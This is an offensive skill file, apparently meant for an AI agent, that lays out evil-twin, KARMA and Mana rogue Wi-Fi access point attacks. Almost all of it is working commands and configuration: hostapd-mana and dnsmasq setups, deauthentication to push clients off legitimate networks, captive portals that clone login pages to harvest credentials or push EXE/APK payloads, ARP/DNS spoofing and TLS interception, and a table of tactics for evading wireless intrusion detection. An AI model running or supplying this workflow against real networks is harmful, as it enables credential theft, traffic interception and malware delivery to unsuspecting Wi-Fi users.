---
name: offensive-evil-twin
description: Evil Twin / KARMA / Mana access point methodology — rogue AP construction
  with hostapd-mana / wifiphisher / airgeddon, KARMA universal probe response, Mana
  selective probe response, captive portal phishing, deauth-driven client coercion
  to attacker AP, MAC randomization defeat via PNL leak analysis, post-association
  MITM (DNS, ARP, transparent proxy), credential capture for portal/web/SMB, and detection-evasion
  tactics. Use to coerce client devices onto an attacker-controlled AP, intercept
  their traffic, harvest credentials, or deliver payloads via captive portal.
---

# Evil Twin / KARMA / Mana

Stand up an AP that looks like (or is more attractive than) the legitimate target. Clients associate, you become their gateway, you intercept everything. The classic "captive portal at the airport" attack pattern, scaled to whatever the engagement requires.

## Quick Workflow

1. Discover target ESSID(s) clients are looking for (PNL — Preferred Network List)
2. Stand up rogue AP advertising matching ESSID(s)
3. (Optional) Deauth clients off legitimate AP to push them toward yours
4. Run captive portal / transparent MITM
5. Capture creds, deliver payload, or harvest sessions

---

## Variants

| Variant | Mechanic | Use Case |
|---|---|---|
| **Evil Twin** | Same ESSID + BSSID as legit AP | Open or PSK-known networks (ISP cafe Wi-Fi, public guest) |
| **KARMA** | Respond "yes" to every probe request | Clients with broad PNLs (most older devices) |
| **Mana** | Respond selectively to probes per-client | KARMA-aware MAC randomization defenses |
| **Known Beacons** | Beacon a list of likely-known ESSIDs | Wide-net attraction without seeing probes first |
| **Captive Portal** | Force splash page on association | Phishing, payload delivery |

## Open / PSK-Known Evil Twin

Use when you know (or have cracked) the PSK.

```bash
# wifiphisher — opinionated automation including portal templates
sudo wifiphisher --essid CorpWiFi --noextensions --force-hostapd

# airgeddon (interactive menu, good for one-off)
sudo airgeddon
# → Evil Twin attacks menu → Captive Portal

# Manual: hostapd + dnsmasq + iptables redirect
cat > /tmp/hostapd.conf <<EOF
interface=wlan0
driver=nl80211
ssid=CorpWiFi
hw_mode=g
channel=6
auth_algs=1
wpa=2
wpa_passphrase=KnownPSK
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF
sudo hostapd /tmp/hostapd.conf &

# DHCP/DNS via dnsmasq
cat > /tmp/dnsmasq.conf <<EOF
interface=wlan0
dhcp-range=10.10.10.10,10.10.10.50,12h
dhcp-option=3,10.10.10.1
dhcp-option=6,10.10.10.1
address=/#/10.10.10.1   # wildcard DNS to attacker
EOF
sudo dnsmasq -C /tmp/dnsmasq.conf -d
```

## KARMA — Universal Probe Response

```bash
# hostapd-mana with KARMA mode enabled (mana_mode=1)
cat > /tmp/karma.conf <<EOF
interface=wlan0
ssid=KARMA
hw_mode=g
channel=6
mana_loud=1
mana_macacl=0
EOF
sudo hostapd-mana /tmp/karma.conf
```

Modern clients with MAC randomization probe with random MACs and a randomized PNL — KARMA's universal-yes response is now triggers on probes the client wouldn't actually associate to. Use Mana for better selectivity.

## Mana — Selective Per-Client Response

```bash
# hostapd-mana (default mode is mana, not loud)
cat > /tmp/mana.conf <<EOF
interface=wlan0
ssid=Free-WiFi
hw_mode=g
channel=6
mana_mode=1
mana_macacl=0
mana_outfile=/tmp/mana.log
EOF
sudo hostapd-mana /tmp/mana.conf
```

Mana tracks MAC → ESSID-probe-list. When that MAC associates, Mana picks one realistic ESSID from its observed probe list and responds consistently. Defeats KARMA-aware client-side mitigations.

## Known Beacons Attack

```bash
# eaphammer can broadcast a list of likely-known ESSIDs as actual beacons
eaphammer --essid-file likely_essids.txt --hostile-portal
# likely_essids.txt: airport, cafe, hotel, office defaults from open intel
```

Beacons attract spontaneous association from devices whose PNLs include these names. Useful when you don't see probes (modern devices broadcast fewer probes than they used to).

## Deauth Coercion

Push existing clients off legitimate AP to your evil twin:

```bash
# On a different interface (or after stopping airbase-ng)
sudo aireplay-ng --deauth 10 -a <legitimate-BSSID> wlan0_mon2
```

Combined with stronger signal (closer position) or higher TX power on your AP, the client roams to you on reconnection.

**Detection trade-off:** broadcast deauth is loud; targeted single-client deauth is quieter. PMF (802.11w) blocks unencrypted deauth — see `offensive-deauth-disassoc`.

## Captive Portal / Credential Capture

```bash
# Portal options in eaphammer / wifiphisher / airgeddon include:
# - Generic OAuth-style (Google/MS/Facebook clones)
# - Vendor router login pages (matched to nearby AP brand)
# - Corporate-themed portal harvesting AD creds
# - Update-required prompts delivering EXE/APK payloads

# Custom: simple Flask+iptables setup
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j DNAT --to-destination 10.10.10.1:8080
iptables -t nat -A POSTROUTING -j MASQUERADE
python3 -m flask run --host=10.10.10.1 --port=8080
```

For high-fidelity portals, mirror the legitimate captive portal's HTML/CSS exactly. Most users skim, don't read URLs.

## Post-Association MITM

Once a client associates and you're their gateway:

```bash
# Transparent TLS MITM (requires CA cert install on client OR clients with MITM-able apps)
mitmproxy --mode transparent --showhost --ssl-insecure

# Bettercap full pipeline (sniff, ARP, DNS, JS injection)
sudo bettercap -iface wlan0 -eval "set arp.spoof.targets *; arp.spoof on; net.sniff on; http.proxy on"
```

Without portal-level CA install, modern HTTPS / HSTS / certificate pinning prevents most TLS interception. Useful targets:

- Captive portal cleartext flows
- Apps with broken pinning (run `offensive-mobile` skills against the app)
- Plain-HTTP services still in use (legacy IoT, old mgmt panels)
- DNS hijack (return attacker IPs for non-pinned services)

## MAC Randomization Defeat

iOS, recent Android, and Windows 11 randomize MACs per network. They still leak per-network stable identifiers in:

- Per-SSID MAC consistency (same MAC for same SSID over time)
- Probe sequence numbers
- 802.11 IE order (manufacturer fingerprint)

```bash
# Cluster probes to track devices across MACs
hcxdumptool -i wlan0mon --enable_status=15 --rds=2
# Analyze with hcxhash2cap / wifite-style fingerprinting
```

## Detection Considerations

| Defender Signal | Mitigation by Attacker |
|---|---|
| Rogue AP detection (BSSID not in WIPS allow-list) | Match real BSSID exactly + suppress own AP advertisement |
| KARMA pattern (single AP responding to many ESSIDs) | Use Mana mode |
| RSSI delta (your AP closer than legit) | Run from a distance, lower TX power |
| Beacon timing inconsistency vs real AP | Match beacon interval, IE order |
| Captive portal HTML differs from real portal | Mirror exactly, refresh weekly |

Modern enterprise WIPS will flag KARMA almost immediately. Mana + matched BSSID is harder to detect without active de-cloaking by defenders.

## Engagement Cheatsheet

```bash
# 1. Recon — passive observe target ESSIDs and clients (no probes from you)
sudo airodump-ng wlan0mon -w probes

# 2. Pick mode based on environment
#    - PSK known + co-located: spoofed BSSID + matched PSK + targeted deauth
#    - Open networks (cafe, airport): straight evil twin or KARMA
#    - Heterogeneous device population: Mana

# 3. Stand up rogue AP
sudo hostapd-mana /tmp/mana.conf
sudo dnsmasq -C /tmp/dnsmasq.conf

# 4. Captive portal / payload delivery / MITM
mitmproxy --mode transparent --showhost --ssl-insecure

# 5. Coerce specific clients if needed (deauth on legit AP)

# 6. Document captures, sessions, and time-on-target
```

---

## Key References

- hostapd-mana: github.com/sensepost/hostapd-mana
- wifiphisher: wifiphisher.org
- airgeddon: github.com/v1s1t0r1sh3r3/airgeddon
- KARMA / Mana original talks (DEF CON, Sensepost research)
- "Probing into the Past" research on PNL exploitation
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/wireless.md
